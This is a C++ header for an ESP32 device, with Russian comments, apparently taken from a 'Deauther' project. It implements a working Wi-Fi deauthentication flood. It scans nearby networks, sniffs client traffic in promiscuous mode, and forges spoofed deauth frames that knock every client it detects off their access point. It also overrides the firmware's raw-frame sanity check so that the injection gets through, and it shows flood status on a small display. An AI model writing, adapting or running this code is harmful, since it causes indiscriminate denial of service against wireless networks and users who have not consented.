// Взял код с репозитория electronicminer/ESP32-s3-Deauther-master-with-apple-juice/tree/main

// Что бы не было ошибок
#pragma once // В душе не чаю

// Библиотеки
#include <Arduino.h> // Базовые функции/фишки Arduino

// Библиотеки ESP32
#include <esp_wifi.h> // Низкоуровневые Wi-Fi функции/фишки ESP32

const int deauthFrameCount = 16;
const int deauthMaxCacheCount = 64;
static int deauthCacheCount = 0;
static char currentDeauthSSID[33] = "";

struct cachedNetwork {  
  uint8_t BSSID[6];
  char SSID[33];
  bool VALID;
};
static cachedNetwork networkCache[deauthMaxCacheCount];

typedef struct {
  uint8_t FRAME_CONTROL[2] = { 0xC0, 0x00 };
  uint8_t DURATION[2];
  uint8_t STATION[6];
  uint8_t SENDER[6];
  uint8_t ACCESS_POINT[6];
  uint8_t FRAGMENT_SERQUENCE[2] = { 0xF0, 0xFF };
  uint16_t REASON;
} DEAUTH_FRAME;
typedef struct {
  uint16_t FRAME_CONTROL;
  uint16_t DURATION;
  uint8_t DESTINATION_ADDRESS[6];
  uint8_t SOURCE_ADDRESS[6];
  uint8_t BSSID[6];
  uint16_t SEQUENCE_CONTROL;
  uint8_t ADDRESS_4[6];
} MAC_HEADER_FRAME;
typedef struct {
  MAC_HEADER_FRAME hdr;
  uint8_t PAYLOAD[0];
} WIFI_FRAME;

DEAUTH_FRAME deauthFrame;

extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
  return 0;
}
const wifi_promiscuous_filter_t filt = {
  .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA
};
esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void *buffer, int len, bool en_sys_seq);

IRAM_ATTR void sniffer(void *buf, wifi_promiscuous_pkt_type_t type) {
  const wifi_promiscuous_pkt_t *rawPacket = (wifi_promiscuous_pkt_t *)buf;
  const WIFI_FRAME *packet = (WIFI_FRAME *)rawPacket->payload;
  const MAC_HEADER_FRAME *macHeaderFrame = &packet->hdr;

  const uint16_t packetLenght = rawPacket->rx_ctrl.sig_len - sizeof(MAC_HEADER_FRAME);

  if (packetLenght < 0) return;

  if ((memcmp(macHeaderFrame->DESTINATION_ADDRESS, macHeaderFrame->BSSID, 6) == 0) && 
      (memcmp(macHeaderFrame->DESTINATION_ADDRESS, "\xFF\xFF\xFF\xFF\xFF\xFF", 6) != 0)) {
    
    memcpy(deauthFrame.STATION, macHeaderFrame->SOURCE_ADDRESS, 6);
    memcpy(deauthFrame.ACCESS_POINT, macHeaderFrame->DESTINATION_ADDRESS, 6);
    memcpy(deauthFrame.SENDER, macHeaderFrame->DESTINATION_ADDRESS, 6);

    const char* foundSSID = nullptr;
    for (int i = 0; i < deauthCacheCount; i++) {
      if (networkCache[i].VALID && memcmp(networkCache[i].BSSID, macHeaderFrame->BSSID, 6) == 0) {
        foundSSID = networkCache[i].SSID;
        strncpy(currentDeauthSSID, foundSSID, 32);
        currentDeauthSSID[32] = '\0';
      }
    }
    
    for (int i = 0; i < deauthFrameCount; i++) {
      esp_err_t result = esp_wifi_80211_tx(WIFI_IF_STA, &deauthFrame, sizeof(deauthFrame), false);
    }
  }
}

void drawDeauthFloodScreen(
  U8G2& u8g2, 
  const char* floodName,
  const char* floodLog) {
  
  char truncatedLog[20];

  if (strlen(floodLog) > 16) {
    snprintf(truncatedLog, sizeof(truncatedLog), "%.16s...", floodLog);
  } else {
    strncpy(truncatedLog, floodLog, sizeof(truncatedLog) - 1);
    truncatedLog[sizeof(truncatedLog) - 1] = '\0';
  }

  // Текст
  u8g2.drawStr((128 - (strlen((String(floodName)).c_str()) * 6)) / 2, 27, (String(floodName)).c_str());
  u8g2.drawStr((128 - (strlen(truncatedLog) * 6)) / 2, 36, truncatedLog);
  u8g2.drawStr(58, 46, "Back");

  // Назад
  u8g2.drawXBM(46, 38, 8, 8, bitmap_small_back);
}

void startDeauthFlood(uint16_t reason) {
  deauthFrame.REASON = reason;
  
  WiFi.mode(WIFI_MODE_STA);
  int n = WiFi.scanNetworks(false, true);
  
  deauthCacheCount = 0;
  for (int i = 0; i < n && i < deauthMaxCacheCount; i++) {
    networkCache[i].VALID = true;
    memcpy(networkCache[i].BSSID, WiFi.BSSID(i), 6);
    strncpy(networkCache[i].SSID, WiFi.SSID(i).c_str(), 32);
    networkCache[i].SSID[32] = '\0';
    deauthCacheCount++;
  }

  WiFi.softAPdisconnect();
  
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_filter(&filt);
  esp_wifi_set_promiscuous_rx_cb(&sniffer);
}

void stopDeauthFlood() {
  esp_wifi_set_promiscuous(false);
  memset(currentDeauthSSID, 0, sizeof(currentDeauthSSID));
  
  for (int i = 0; i < deauthMaxCacheCount; i++) {
    networkCache[i].VALID = false;
  }
  deauthCacheCount = 0;
}
